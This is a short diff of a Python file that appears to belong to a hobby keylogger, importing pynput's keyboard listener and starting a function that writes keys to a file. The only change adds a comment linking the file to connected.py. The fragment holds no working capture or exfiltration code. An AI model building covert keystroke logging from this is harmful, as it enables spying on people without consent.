@@ -1,5 +1,6 @@
 from pynput.keyboard import Listener
 
+#this file is link with connected.py in this same repository
 
 def write_to_file(key):
     letter = str(key)
